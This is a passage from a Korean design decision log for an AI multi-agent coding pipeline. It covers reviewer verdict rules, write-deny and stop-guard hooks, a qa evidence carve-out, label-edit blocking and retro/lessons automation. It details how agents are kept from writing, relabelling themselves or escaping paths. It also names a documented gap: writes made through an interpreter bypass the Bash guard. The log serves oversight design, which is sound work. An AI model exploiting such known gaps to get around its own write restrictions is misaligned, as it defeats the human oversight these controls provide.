- **P3-R3 — review**. R1은 cold read(빌더 설명·다른 리뷰어 판정 모두 배제)이고, R2는 §7.5 그대로 R1에 reject가 하나라도 있으면 전원 `R2_FULL`, 만장일치 approve면 `R2_LIGHT`(missed 있는 리뷰어만 승격)로 갈라진다(`anyReject` 분기). `verdicts[].role`은 로스터 이름 그대로다(`normalize(v, r.name)`가 에이전트가 자칭한 `role`을 덮어써, 리뷰어가 스스로를 다른 역할로 속일 수 없게 한다). R1 verdict는 `must_fix.length`로부터 유도된다(`normalize`/`applyFull`이 `mustFix.length > 0 ? 'reject' : 'approve'`로 재계산) — approve라 답했는데 must_fix가 있으면 reject로, reject인데 must_fix가 비어 있으면 approve로 강제 정정된다. qa는 `PLAN_FIELDS` 맵을 통해 `handoffs.plan.done_when`(id/text/verify/level만, `files_expected`/`non_goals`는 제외)을 R1 프롬프트에서 읽는다 — cold read는 **빌더의 산출물**(PR 설명·코멘트·커밋 메시지)을 배제하는 것이지 plan handoff를 배제하는 것이 아니다(§5.2.3가 §7.1의 일반 cold_read 문구보다 우선). must_fix id는 접두 규약(`PREFIXES`: `cf`=correctness, `sec`=security, `arch`=architecture, `spec`=spec-conformance, `qa`=qa, 그 외 역할은 자기 이름을 접두로 씀)으로 리뷰어에게 되돌아간다(`ownerOf`). 답변이 오지 않은 dispute는 `unruled`로 기록되고 `upheld`와 같은 효과(다음 R1의 must_fix에 재부착, reject 유지)를 갖지만 같은 사실은 아니므로 별도 라벨로 남는다("불명확한 침묵을 판정으로 착각하지 않는다"). `disputes[].by`는 판정을 낸 리뷰어 이름(`role`과 동일)이고, 소유자가 없는 dispute id는 `{role: null, by: null, ruling: 'unowned'}`로 남아 로스터가 라운드 사이에 줄어든 사실을 사람이 볼 수 있게 한다.
- **P3-R5 — plan**. §7.5 발췌의 `return { r1, r2, plan }` 주석은 실제로는 `plan.v1` 필드가 **최상위**에 그대로 스프레드되고(`{...(plan||{}), issue, tier, roles, rounds, orchestration, guarantee}`) `debate: { r1, r2, votes }`가 별도 필드로 얹히는 형태로 구현됐다 — `verify-stage`가 `plan.v1`을 최상위 객체에 대고 검증하기 때문에, `plan` 아래에 중첩돼 있으면 검증이 통과하지 못한다. `docs/factory/runs/`용 사람 가독 본문은 `lib/handoff.js`의 `planBody()`가 R1 입장 요약(`firstSentence`) 한 줄씩, R2 objection 개수, sign-off 표결 결과, dissent를 하나의 handoff 코멘트 본문으로 합쳐서 만든다 — 계획 문서 초안의 "라운드별 코멘트 3개"는 채택되지 않았다(단순성; 기계 블록은 코멘트당 하나). `boundToMaturity`는 `done_when.level`이 `harness.maturity`(loader가 넘긴 값)의 허용 레벨을 넘으면 최고 허용 레벨로 낮추고 `dissent_log`에 `role: 'workflow'`인 항목을 남긴다 — 재합성이 같은 항목을 다시 올려 보내도 같은 objection이 중복되지 않도록 이전 동일 항목을 대체한다. sign-off 2차 시도에서도 남은 objection은 동일한 방식(같은 role+objection 키로 대체)으로 dedup되어 `dissent_log`에 쌓인다.
- **P3-R6/R7/R8**. workflow 하네스는 `node:vm`으로 스크립트를 그대로 실행하고 `Date`/`Math.random`/`fs`를 노출하지 않는다(`factory/test/helpers/run-workflow.js`). `factory-merge.js`·`factory-integrator.md`·`factory-retro.md`/`factory-retro.js`는 Plan 3에서 만들지 않는다(ADR-015 R3, Plan 4로 이연) — `roles.toml`은 `[merge.integrator]`·`[retro.analyst]` 블록을 여전히 갖고 있지만(스펙 §7.1 예시 verbatim 유지), 그 파일들이 설치되지 않으므로 `checkRoles`의 `roles.agent-files`는 이 두 항목에 한해 FAIL을 보고한다 — 이는 알려진 gap이며 Plan 4가 채운다. 네 workflow의 `once()`는 정확히 1회 재spawn하고 두 번째 null은 그대로 null로 접어 호출자가 역할을 지어내지 않는다(P3-R8).
- **추가 실행 판결 (계획 문서에 없던 세부, 코드·테스트로 확정)**:
  1. `roles.toml [triage]`에 `lessons = ".factory/lessons/factory-triage.md"`가 추가됐다 — 스펙 §7.1 예시(발췌)는 `lessons` 없이 `agent`/`model`/`output`만 가진 `[triage]`를 보여주지만, `checkAgents`가 모든 role `.md`의 `## Lessons` 섹션에 `.factory/lessons/<name>.md` 경로가 있는지 lint하므로(§7.2) `triage`만 예외로 둘 근거가 없다. 14개 role(+loader) 전부 `.factory/lessons/<name>.md` 스켈레톤 파일을 갖는다(loader·synthesizer·triage 포함 — `templates/factory/factory/lessons/*.md`).
  2. `factory/lib/agent-md.js`의 `lintAgentMd`는 `## Purpose`, `## You receive`, `## You must not`, `## Lens`, `## Output`, `## Examples`(좋은 발견/나쁜 발견 각 ≥2), `## Perspectives`(≥3), `## Lessons`(경로 포함), frontmatter `name`(파일명과 일치)·`model`(opus/sonnet/haiku)·`tools`(비어있지 않음), 쓰기 금지 역할(`reviewer-*`/`plan-*`/`factory-triage`/`factory-verifier`/`factory-loader`)의 `deny-all-writes.sh` 훅 배선을 검사한다. 헤더는 접두 관용(prefix-tolerant)이다 — `## Lens`, `## Lens — 무엇을 보는가`, `## Lens:`, `## Lens (deprecated)`는 같은 섹션으로 인정하지만 `## Lenses`나 `## Lens of the reviewer`는 아니다(뒤에 오는 것이 ` —`/`:`/` (` 중 하나여야 한다는 규칙, `DECORATORS`). `checkAgents`(`factory/lib/doctor/factory.js`)는 이 lint를 `roles.toml`이 가리키는 모든 에이전트 경로 + loader에 대해 실행한다.
  3. `github.protection`(`checkGitHub`)은 branch protection의 `required_status_checks.contexts`를 `harness.factory.required_checks`가 아니라 `L0_CONTEXTS`(`factory/lib/bootstrap.js` — `["factory/integrity"]`, ADR-015 보강)에 대해서만 비교한다. `harness.factory.required_checks`(L1이 머지 직전에 실제로 요구하는 체크 목록)는 별도 줄 `github.required-checks`로 "enforced by L1 at merge: …"라고만 보고한다 — 두 목록을 같은 doctor 항목에서 비교하면 부트스트랩이 절대 넣지 않는 체크가 계속 "빠졌다"고 잘못 보고된다.
  4. `factory/lib/doctor/harness.js`의 `protected.globs-match`는 `[protected].factory`의 글롭 중 **와일드카드가 있는데** 매치하는 파일이 없는 것(`playwright.config.*`, `tsconfig*.json` 등 — 아직 그런 파일이 없는 것이 정상인 미래 대비 글롭)은 PASS로, 상세를 `(optional, no match): <glob목록>`으로 남긴다. 와일드카드 없는 **리터럴 경로**가 매치하지 않으면(오타·삭제) WARN이다.

**결정**: 위 관측대로 P3-R1~R8과 다섯 가지 실행 세부(loader schema/`checkAgents`, rework 완결성, R1 verdict 유도, plan return 계약, `[triage].lessons`+lint 규칙+L0/required-checks 분리+wildcard glob PASS)를 Plan 3의 확정 동작으로 채택한다. `factory-integrator.md`/`factory-retro.md`가 아직 없어 `roles.agent-files`가 FAIL을 보고하는 것은 Plan 4까지의 알려진 gap이며 버그가 아니다.

**영향**: §4.2.3(loader의 LOADER schema에 `maturity` 포함, fail-closed 응답 모양), §7.1(`[triage].lessons` 추가, merge.integrator/retro.analyst 미설치 각주), §7.2(doctor 검사 = `lintAgentMd` 규칙 목록), §7.5(plan return 계약을 `plan.v1` 최상위 + `debate`로 교체, review의 id 접두 표·`unruled`·verdict-from-must_fix·qa의 plan 접근, rework 완결성은 workflow가 센다는 문장), §5.2.3(correctness/security/architecture는 plan handoff를 읽지 않는다는 한 문장 추가), §2.1/README(설치되는 Claude-side 파일 수 — workflow 4·agent 14·dispatcher 4).

**보강 — 최종 리뷰 반영** (fix round, F1–F13) — 2026-09-12: Plan 3 브랜치 전체 리뷰에서 나온 13건을 한 라운드로 반영했다. 대부분은 "코드는 스펙대로인데 그 스펙이 런타임 사실과 어긋난다"는 종류였다 — 리뷰 스테이지가 자기 게이트 파일을 아직 만들지 않았다는 것, 리뷰어가 한 가지 schema만 답하는 게 아니라는 것, qa가 증거를 쓸 곳이 없다는 것.

- **F1 — 판정 훅은 리뷰 schema 셋을 전부 안다**. `factory/hooks/verdict-format.sh`는 마지막 어시스턴트 메시지에 ```json 펜스 + `"verdict"`를 요구했는데, `factory-review.js`는 같은 `reviewer-*` 에이전트를 세 schema로 띄운다 — R1/`R2_FULL`(`verdict`), `R2_LIGHT`(`missed`), `DISPUTE`(`rulings`). 그래서 경량 R2와 dispute 라운드는 **매번** SubagentStop에서 exit 2로 막혔다(= 만장일치 approve 경로가 구조적으로 needs-human으로 떨어졌다). 이제 셋 중 하나면 통과한다. 관용은 schema 이름에만 적용된다 — 펜스 없는 산문은 여전히 exit 2다.
- **F2 — `gates.json`은 리뷰 시점에 **없는 것이 정상**이다**. `run-stage.js`는 `claude -p` **앞에서** `.factory/out/`을 지우고, 게이트는 workflow가 return한 **뒤에** 돈다(§4.2.1 step 5·6). 그런데 R1 프롬프트와 리뷰어 다섯의 `.md`는 그 파일을 "원본 근거"로 읽으라고 지시하고 있었다 — 없는 파일을 찾다가 "확인 불가 → reject"로 가거나, 더 나쁘게는 이전 스테이지가 남긴 stale한 파일을 읽는다. 모든 언급을 "`.factory/out/gates.json` **if present** — in the review stage the gates for this commit run after you, so it is normally absent; judge the diff and the tests themselves"로 바꿨다. `reviewer-correctness.md`는 스펙 §7.3 예시의 전사이므로 `agent-md.test.js`의 픽스처도 같이 고쳤다(픽스처와 템플릿이 여전히 바이트 단위로 대응한다 — 훅 matcher 한 줄만 예외).
- **F3 — qa의 증거 디렉터리를 쓸 수 있게 했다**. `[evidence].qa_artifacts = ".factory/out/qa/**"`는 있는데 `[protected].factory`의 `.factory/**`가 그것을 덮고 있었다 — qa는 "증거 없는 재현은 일어나지 않은 재현"이라는 규칙을 지킬 방법이 없었다. ① `harness.toml [protected].except`에 `.factory/out/qa/**` 추가, ② `block-dangerous.sh`는 보호 경로 검사에만 쓰는 사본에서 `.factory/out/qa/…` 토큰을 지워 카브아웃한다(`.factory/`의 나머지는 그대로 차단), ③ `deny-all-writes.sh`는 `Write`/`Edit`의 `file_path`가 `./`(그리고 `$CLAUDE_PROJECT_DIR/` — run-stage가 `claude -p`에 넘기는 저장소 루트)를 한 겹씩 벗긴 뒤 `.factory/out/qa/`로 시작하면 통과시킨다. 도구는 보통 **절대 경로**를 주므로 저장소 루트를 모르면 qa는 증거를 한 줄도 남길 수 없다; 반대로 루트가 비어 있거나 경로가 루트 밖이면(`/tmp/evil/.factory/out/qa/x`) 거절한다 — 모르는 것을 허용하는 예외는 예외가 아니다. Bash arm의 허용 대상도 같다(`$CLAUDE_PROJECT_DIR/.factory/out/qa/…`). 두 훅 모두 경로에 `..`가 섞이면 카브아웃을 **통째로 끈다** — 정규화 없이 탈출을 허용하는 예외는 예외가 아니라 구멍이다. `NotebookEdit`에는 예외가 없다. 아울러 `reviewer-qa`의 도구에서 `mcp__playwright__*`를 뺐다(1.0은 MCP 서버를 설치하지 않으므로 존재하지 않는 도구를 프론트매터에 적어 두는 셈이었다): qa는 `[test.env].app_start`가 채워져 있으면 `Bash`로 `npx playwright` 스크립트를 몰고, 비어 있으면 브라우저를 지어내는 대신 테스트 러너·CLI로 `done_when`을 재현하고 무엇을 UI에서 확인하지 못했는지 명시한다. `reviewer-spec-conformance`의 "증거 없으면 발견" 규칙은 유지하되 **이번 tier의 로스터에 `qa`가 있을 때로** 한정했다 — docs tier에는 qa가 없고, 부르지 않은 사람이 남기지 않은 증거는 결함이 아니다.
- **F4 — `factory doctor` CLI가 실제로 돈다**. `factory/cli/index.js`가 `doctorCommand({root, pkgRoot, argv, io})`를 `run` 없이 불렀다. `doctorCommand`에는 `run` 기본값이 없어(외부 프로세스는 전부 주입한다는 Plan 1a 규칙) 첫 `run("git", ["ls-files"])`에서 죽었다 — 단위 테스트는 항상 `run`을 넘겨 불렀기 때문에 이 배선만 아무도 밟지 않았다. `run: realRun`을 넘기고, CLI 진입점을 그대로 통과하는 테스트를 `cli-index.test.js`에 넣었다.
- **F5 — `[merge.integrator]` 삭제, retro 부재는 WARN**. merge는 `claude -p`를 전혀 부르지 않는 스크립트 전용이다(ADR-015 R3) — roles.toml에 integrator를 남겨 두면 "언젠가 에이전트가 머지한다"는 약속이 설정 파일에 남고, `doctor`는 절대 설치되지 않을 파일을 계속 FAIL로 보고한다. 블록을 지웠다. 남은 미설치 역할은 `[retro.analyst]` 하나이고, `checkRoles`는 **stage가 `retro`일 때만** 그 부재를 "arrives with Plan 4" WARN으로 낮춘다(다른 스테이지는 그대로 FAIL, 그리고 FAIL이 있으면 FAIL이 이긴다). 결과로 갓 `factory init`한 저장소의 `doctor`가 역할 파일 stub 없이 exit 0이 된다 — 실제 사용자가 보는 상태가 그것이다.
- **F6 — Bash 쓰기 차단과 SubagentStop 가드**. (a) `deny-all-writes.sh`에 `Bash` arm을 넣었다. 판정 방향은 `block-dangerous.sh`의 `prot` 관용과 **정반대**다 — 대상이 `/tmp`·`$TMPDIR`·`.factory/out/qa/`(·`/dev/null`류)가 **아니면** 막는다. 구현도 같은 방식이다: 허용 대상을 지운 사본에 대고 "쓰는 모양"(리다이렉션, `tee`, `rm`/`mkdir`/`touch`류, cp/mv의 **목적지**, 트리를 옮기는 git 서브커맨드)을 찾는다. `sed -i`·`perl -i`·`python -c … open(…)`은 대상과 무관하게 막는다 — 쓰기 금지 역할에게 정당한 제자리 편집은 없고, 임시 파일이 필요하면 `/tmp`로 리다이렉션하는 길이 이미 열려 있다. `git diff`/`git log`/`npx vitest run`/`cat`/`grep`/`node .factory/bin/prove-test.js`는 통과한다(prove-test는 워크트리를 OS 임시 디렉터리에 만든다). **그리고 같은 라운드에서 matcher도 함께 넓혔다**: 쓰기 금지 역할 13개(`factory-loader`·`factory-triage`·`factory-verifier`·`plan-*` 5·`reviewer-*` 5 — builder만 제외)의 `hooks.PreToolUse.matcher`가 `Edit|Write|NotebookEdit|Bash`다. 스크립트가 Bash를 판정해도 매처가 `Edit|Write`면 그 판정은 **절대 발화하지 않는다** — 반쪽 deny는 deny가 아니다. `lintAgentMd`의 `deny-hook` 규칙이 이제 "명령이 `deny-all-writes.sh`이고 matcher의 대안 목록에 `Bash`가 있을 것"을 요구하므로, 새 역할 파일이 이 배선을 빠뜨리면 `doctor`가 FAIL한다. 스펙 §7.3 예시의 `matcher:` 한 줄도 같이 고쳤다(인라인 주석 `(Plan 3 실행 판결, ADR-016)`). (b) `settings.json`의 `SubagentStop`에 `stop-guard.sh`를 추가했다 — 실제로 일하는 것은 서브에이전트다. builder는 자기 서브에이전트가 끝나기 전에 commit+push를 마쳐야 하고 reviewer는 트리를 깨끗이 두고 나가야 하는데, 메인 세션의 `Stop`에서만 검사하면 그 사실이 workflow가 다 끝난 뒤에야 드러난다.
- **F7 — handoff 페이로드를 줄였다**. plan의 `debate`는 이제 `{r1: [{role, position}], r2_objections: <숫자>, votes}`이고, review는 `r1`을 아예 싣지 않는다. 이 객체는 이슈 코멘트의 ```json 블록으로 나가고 그 코멘트는 다음 스테이지의 `context.json`에 다시 실린다 — R1 전문 4개와 R2 반박 전문을 넣으면 handoff 하나가 사람이 읽을 수 없는 크기가 되고, 그 비용을 implement·review가 매번 다시 치른다. 사람용 본문(`handoff.js planBody`)이 쓰던 것도 첫 문장과 반박 **개수**뿐이었다. review의 `verdicts`는 이미 R2 결과이고(경량 R2에서 missed가 없으면 R1 그대로), 마음을 바꾼 사람은 `verdicts[].on_others`와 `summary`가 말한다.
- **F8** — `factory-plan.yml` `timeout-minutes: 45 → 60`(스펙 §4.1 표 포함). opus 4대가 R1·R2·종합·서명 2회를 도는 구간이 있어 45분은 상한이 먼저 온다.
- **F10** — plan·implement 프롬프트의 `docs/TECHNICAL.md`·`docs/QA.md`를 "(if present)"로 바꿨다. 그린필드 저장소에는 둘 다 없고, 없는 것은 발견이 아니다.
- **F11** — `[plan.synthesizer]`에 `lessons = ".factory/lessons/plan-synthesizer.md"`를 넣었다(스켈레톤 파일은 이미 있었고 프롬프트도 그 경로를 읽고 있었다 — roles.toml만 비어 있었다).
- **F12** — CHARTER 템플릿의 docs tier 행을 "2 (입장 → synthesizer 종합; 교차검토 생략)"으로 고쳤다. `plan_rounds.docs = 2`일 때 `factory-plan.js`가 실제로 건너뛰는 것은 교차검토다.
- **F13** — `block-dangerous.sh`가 `gh issue edit … --add-label/--remove-label factory:*`와 `gh api … /issues/<n>/labels`를 막는다. 상태 라벨은 L1(`transition.js`)만 옮긴다 — 에이전트가 직접 붙이면 라벨 그래프가 거부했어야 할 전이가 조용히 일어나고 다음 스테이지 워크플로가 그 라벨 이벤트로 깨어난다. `gh issue comment`/`gh pr comment`는 그대로 허용한다(handoff·rework-response가 코멘트로 나간다).
- **고정 역할의 `model`은 workflow 상수다(문서화된 한계)**. `builder`/`verifier`/`plan-synthesizer`는 로스터 역할이 아니라 workflow가 이름으로 부르는 고정 스텝이라, `agent()`의 `model`을 loader가 읽어 온 `roles.toml` 값이 아니라 workflow 안의 리터럴(`'opus'`)로 넘긴다. 로스터 역할(토론자·리뷰어)만 `roles.toml`의 모델을 탄다. `roles.toml`에서 이 셋의 `model`을 바꿔도 실행 모델은 바뀌지 않는다 — 1.0의 알려진 한계이며, 바꾸려면 loader schema에 고정 역할용 필드를 더해야 한다.

- **Bash arm의 문서화된 한계 — 인터프리터를 거친 쓰기는 모양으로 잡지 않는다**. `deny-all-writes.sh`의 Bash arm은 *쓰는 모양*(리다이렉션 `>`/`>>`/`>|`, `tee`, `cp`/`mv`의 목적지, 파일 유틸리티, 제자리 편집, 트리를 옮기는 git 서브커맨드, `git config` 쓰기)을 정규식으로 찾는다. 인터프리터가 인자로 받은 코드나 스크립트 파일 안에서 쓰는 것(`node -e "require('fs').writeFileSync(…)"`, `python script.py`, `install`, `rsync`, 빌드 스크립트가 부르는 무엇)은 **모양이 없으므로 잡히지 않는다**. 이것을 정규식으로 쫓는 것은 임의의 코드를 정적 분석하겠다는 뜻이라 시도하지 않는다 — 그 층의 방어는 다른 곳에 있다: `stop-guard.sh`(서브에이전트/세션이 더티 트리로 끝나지 못한다 — 단, 쓰기 금지 역할의 SubagentStop은 면제다), `factory-integrity.yml`(보호 경로가 diff에 있으면 PR 자체가 막힌다), 그리고 게이트가 **PR head sha에 묶여** 돈다는 사실(워크트리에서 몰래 고친 것은 판정 대상이 아니다). Bash arm은 "실수로 소스를 고치는 것"을 막는 층이지 적대적 코드 실행을 막는 층이 아니다.
- **`stop-guard.sh`는 SubagentStop에서 쓰기 금지 역할을 면제한다**(micro-fix). `agent_type`이 `reviewer-*`·`plan-*`·`factory-loader`·`factory-triage`·`factory-verifier`면 즉시 exit 0이다. 이유는 교착이다: 그 역할들이 돌리는 러너는 untracked 산출물을 남기는데(playwright `test-results/`, `coverage/`) 지우려면 쓰기가 필요하고 쓰기는 바로 그 역할에게 금지돼 있다 — 가드가 걸리면 서브에이전트가 영원히 멈추지 못한다. 가드의 원래 대상은 builder(커밋+push해야 한다)와 메인 세션(트리를 깨끗이 두어야 한다)이며 둘 다 그대로 남는다. 함께 `reviewer-qa.md`에 playwright 출력 경로를 `/tmp/qa-results`(증거는 `[evidence].qa_artifacts`)로 넘기라는 지시를 넣어, 애초에 저장소 루트에 아무것도 떨어지지 않게 했다.

**영향**(보강분): §4.1(`factory-plan.yml` 60분), §5.2.3(qa는 MCP가 아니라 Bash로 브라우저를 몬다; 증거 디렉터리 쓰기 권한), §5.1(`[protected].except`에 `.factory/out/qa/**`), §6.3(`SubagentStop`에 `stop-guard.sh`; `deny-all-writes.sh`의 Bash arm; 라벨 편집 차단), §7.1(`[merge.integrator]` 삭제, `[plan.synthesizer].lessons`, `[review.qa].tools`), §7.3(리뷰어들의 `gates.json` 항목), §7.5(plan `debate` 다이제스트, review에서 `r1` 제거), §11(`doctor`의 `roles.agent-files`가 retro 부재를 WARN으로 보고).

---

## ADR-017 Plan 4 판결 — 경량 수확은 결정적, lessons PR 자체 머지, 격리 등록은 retro, `_retro.md` 상태 — 2026-09-12

**질문**: Plan 4(retro·lesson·격리 등록)를 구현하려면 계획 문서의 P4-R1~R7이 각각 어떤 코드 모양으로 확정되는지 답해야 했고, 계획에 없던 세부 — `_retro.md`를 브랜치 위에서 안전하게 갈아치우는 법, 통계를 창(window)과 누적(total) 중 어디에 더할지, 격리 "등록"의 정확한 트리거, lessons PR 실패를 누가 보는지, 성숙도 격차 판정을 언제 굳힐지 — 도 구현 중에 결정해야 했다. 8개 태스크(SDD ledger `docs/superpowers/plans/2026-09-12-factory-plan-4-retro.md` 실행) 전부 TDD·opus 코드 리뷰·fix round를 거쳐 확정했다.

**관측** (Task 1~6 구현·리뷰, `factory/lib/retro/*.js`·`factory/bin/retro.js`·`templates/factory/{github/workflows,claude/{commands,workflows,agents}}/factory-retro.*`):

- **P4-R1 — 경량 수확은 결정적(LLM 없음)**. `factory/lib/retro/harvest.js`의 `harvest({since, records, issues, flakyIssues, harnessTitles, commentsByIssue})`가 스크립트만으로 must_fix 주장·미해결 dissent·needs-human 사유·flaky id·usage를 후보로 축적한다(fix round에서 `issues`/`flakyIssues`/`harnessTitles` 세 갈래로 분리 — 라벨로 좁히지 않으면 "최근 200개" 창 밖의 flaky·harness 이슈를 놓치고 중복 이슈를 만든다). `mergeCandidates`가 여러 run의 후보를 합집합으로 병합한다. `stats`는 **창 값으로 교체**한다(누적 덧셈이 아니다 — 커서가 안 움직이는 경량 실행이 같은 창을 매번 더하면 이중 집계다). `stats_total`은 **full run에서만** `accumulateStats`가 누적한다: `merged`·`needs_human`·`usage.cost_usd`·`usage.tokens`·`rejects_by_role`·`retros`는 합산, `review_rounds_avg`는 **머지 건수로 가중한 누적 평균**(평균의 평균은 평균이 아니다). `merges_since`는 잡 실행 횟수를 `+1`하는 게 아니라 기록에서 센 머지 수(`stats.merged`)를 **대입**한다 — `shouldRunFull`의 계약이 "`merges_since`는 이번 머지를 아직 반영하지 않은 값"이라 스스로 +1을 더하므로 판정에는 센 값에서 1을 뺀 값을 넘긴다(이중 계산 금지). 셀 수 없을 때(수확 실패, 또는 `light_on_merge: false`로 경량 실행에서 수확을 건너뛴 경우)만 `+1` 폴백이다. `light_on_merge`는 경량 실행에서 후보 수확 자체를 할지를 뜻하고, 머지 카운트(`merges_since`)는 `light_on_merge`와 무관하게 항상 전진한다.
- **분석 실패 → retro는 공장을 멈추지 않는다**. full 경로에서 `claude -p "/factory-retro"`의 결과가 `retro.v1` schema 검증에 실패하거나(구조 위반) JSON을 뽑지 못하거나(`is_error`, JSON 없음, throw) 하면 `factory/bin/retro.js`는 `_retro.md`에 `last_full_failed = {at, reason}`만 기록하고 **`merges_since`·커서는 그대로 유지한 채 exit 0**으로 끝낸다 — 집행 단계(lessons/PR/이슈/격리 등록)는 전혀 타지 않는다. 다음 머지가 같은 창을 다시 시도하므로 재시도는 별도 로직이 아니라 다음 트리거가 자연히 제공한다.
- **P4-R2 — lessons/예시/관점 PR은 retro.js가 스스로 머지**. `factory/lib/retro/publish.js`의 `openAndMergeLessonsPr`은 `withWorktree`(러너 체크아웃을 건드리지 않는 임시 worktree)에서 파일을 쓰고 `git commit`(bot identity) → `integrityCheck`(로컬 선검사, base...HEAD diff) → **GREEN일 때만** `git push` → `gh.createPr` → `factory/integrity` 체크를 폴링(최대 40회×15초 ≈ 10분, entry 없음=pending, `cancel`/`skipping`도 fail, fail-closed) → 통과하면 `gh.mergePr({method:'squash', deleteBranch:true})`로 **자체 머지**한다(L0 = integrity만, ADR-015 보강). integrity RED면 PR 자체를 만들지 않고 push도 하지 않는다. **PR을 연 뒤**의 실패(체크 fail, 폴링 timeout, `gh.mergePr`가 던짐, 폴링 밖 예외)는 전부 바깥 catch가 잡아 `factory:needs-human` 라벨 + 코멘트를 남기고 PR은 열어 둔 채 종료한다(리뷰 fix round: PR이 존재하면 항상 사람이 보라는 표시가 남게 했다). 제안 PR(`openProposalPr`)은 브랜치 `factory/retro-proposal-<date>`, 라벨 `factory:retro-proposal`, ISO 주차는 **`period.from`**(리뷰에서 `to` 대신으로 정정 — §8.3 예시와 일치)으로 계산하며 **머지하지도 폴링하지도 않는다**(ADR-015 R5 — merge 스테이지가 이 PR을 보지 않으므로 사람만 머지할 수 있다). 본문(렌더된 `docs/factory/retro/<stamp>.md`)이 사람에게 `DECISIONS.md` append를 요구한다 — retro는 `DECISIONS.md`를 직접 쓰지 않는다.
- **P4-R3 — 격리 등록의 트리거는 needs-human "도달"**. 첫 구현은 `factory:needs-human` 역사적 전이 횟수를 K회 세어 게이트했으나(리뷰 Critical), `lib/transition.js`의 K 기반 rework 상한이 이미 그 카운트를 상류에서 했으므로 이중 판단이었다 — 판결: `registerFromFlakyIssues`는 **현재 라벨 상태**만 본다(open + `factory:flaky` + `factory:needs-human` + 아직 `quarantine.toml`에 없음 → 등록). `quarantine-ops.js`의 `K` 파라미터는 인터페이스 호환을 위해 남았으나 **문서화된 무효 파라미터**다(어떤 값을 넘겨도 결과가 바뀌지 않는다 — 실제 K는 CHARTER `limits.K`가 `transition.js`에서 이미 집행한다). 등록·복귀·만료는 모두 해당 flaky 이슈에 `<!-- factory-quarantine <registered|returned|expired> id=<id> -->` 코멘트를 남긴다 — 등록은 retro(`registerFromFlakyIssues` + `saveQuarantine`), 복귀·만료는 sweeper(`factory/lib/sweeper.js`가 `applyPolicy`의 `returned`/`expired` 출력을 받아 `issueList({labels:['factory:flaky'], state:'all'})`로 **닫힌 이슈까지** 찾아 코멘트한다 — 이탈 항목이 없으면 검색조차 하지 않는다). fix round에서 실제 버그 하나도 함께 잡았다: `applyPolicy`는 만료 항목을 `quarantine.toml`에서 **내리지 않는다**(플래그만 남긴다 — `returned`만 제거된다); 원래 코멘트 문구·주석이 "toml에서 내렸다"로 거짓이었던 것을 고쳐, 만료 항목은 계속 `quarantine.toml`에 flagged로 남고 그래서 이 코멘트가 만료 사실의 유일한 기록이 되도록 정정했다. TTL 만료(sweeper가 `expired`로 표시) → retro의 `rewriteIssuesForExpired`가 `backlog`+`factory:flaky` 라벨, 제목 `rewrite flaky test at another level: <id>` 이슈를 만든다(제목으로 open 이슈와 dedup). 그 rewrite 이슈가 다시 `factory:needs-human`에 도달하면(`deletionCandidates`, 같은 "현재 라벨" 게이트) `_retro.md`의 삭제 후보로 기록되고 제안 PR의 `test-delete` 항목이 된다 — **채택·`DECISIONS.md` append는 항상 사람**(제안 PR은 절대 자체 머지되지 않는다, 위 P4-R2).
- **P4-R4 — analyst는 후보+근거만, 채택은 전부 L1**. `templates/factory/claude/agents/factory-retro.md`(opus, roster 밖의 단일 분석 역할)는 쓰기 훅(`deny-all-writes.sh`, `Bash` arm 포함)이 걸려 있어 라벨·코드를 건드릴 수 없다. `factory/bin/retro.js`가 `applyLessons`(lesson 근거 ≥2 distinct issues)·`applyRoleAdditions`(예시/관점 근거 ≥2, 에이전트가 "채택"이라 해도 L1이 근거를 세지 못하면 채택하지 않는다)·`renderProposalPr`/`filterByEvidence`(gate 승격 인용 ≥3, 임계 조정 표본 ≥20 run, 역할 변경·신설 근거 ≥10 run, test-delete는 항상 사람, 알 수 없는 kind는 후보로 유보)로 최소 근거 창을 재검사한다 — 미달 후보는 `state.deferred_proposals`/`_retro.md` 후보 목록에 남아 다음 retro가 다시 본다. lessons 상한 초과 시 **인용 0회·가장 오래된 항목부터**만 제거하며, `applyLessons`는 **그 채용이 실제로 성공할 때만** eviction을 수행한다(입양이 거부되면 자리를 비워 둔 채로 끝낸다). Examples 8/8·Perspectives 6 상한도 같은 모듈이 검사한다. 후보 파일(`.factory/out/retro-candidates.json`)은 오직 L1이 쓰고 에이전트는 그 파일과 records만 읽으므로 run 번호를 지어낼 수 없다.
- **P4-R5 — `factory-retro.yml`**. `pull_request: types: [closed]` + `if: merged == true`, `concurrency: { group: factory-retro, cancel-in-progress: false }`(취소 없이 직렬 — 두 번째 retro는 첫 번째가 갱신한 `_retro.md`를 읽고 delta만 처리), `timeout-minutes: 30`, `actions/checkout@v4`의 `ref: ${{ github.event.pull_request.base.ref }}`(PR head/merge ref가 아니라 **머지 결과가 있는 base 브랜치** — fix round에서 정정). `run: node .factory/bin/retro.js`; `factory/cli/run.js`가 `factory run retro [--force]`로 같은 스크립트를 로컬에서 부른다(`--force`는 N 무시하고 전체 실행).
- **P4-R6/R7 — 단일 분석 에이전트 + 후보 파일 계약 + 통계**. `templates/factory/claude/workflows/factory-retro.js`는 `args.candidates`로 받은 경로 하나만 읽어 에이전트 프롬프트에 넣는다(loader 없음). 후보 파일 스키마는 `{period:{from,to}, candidates, stats, history, maturity_gaps}` — `maturity_gaps`는 리뷰에서 **분석 호출 전**으로 옮겼다(계산이 결정적이므로 에이전트가 지어낼 이유가 없어야 하고, 워크플로 프롬프트도 "L1이 찾은 목록이 전부이고 harness 항목은 그 target과 1:1로 맞아야 한다"로 강화했다). `factory/lib/retro/maturity.js`의 `detectMaturityGaps`: (a) 외부 SDK 추가됐는데 `[test.fakes]`에 없음 → `{target:null, rule:'sdk-without-fake'}`(승격이 아니므로 target이 없다 — 이슈 제목은 `harness: <rule> — <reason>`이지 "promote to null"이 아니다), (b) DB 스키마 파일이 있는데 M0 → `{target:'M1', rule:'db-schema-at-m0'}`, (c) HTTP 라우트(프레임워크 의존성 **또는** `routes/` 파일 — 원래 AND로 구현했던 것을 리뷰에서 OR로 정정) 있는데 M1 이하 → `{target:'M2', rule:'http-at-m1'}`. 승격 이슈 제목은 `harness: promote to M<n> — <reason>`이며 열린 `factory:harness` 이슈와 제목으로 dedup한다. P4-R7의 통계(리뷰 라운드 평균·리뷰어별 reject·needs-human 수·사용량)는 L1이 records에서 계산해 `_retro.md`의 사람용 표(`statsTable` — `| metric | this window | cumulative |`)와 제안 PR 본문에 싣는다.
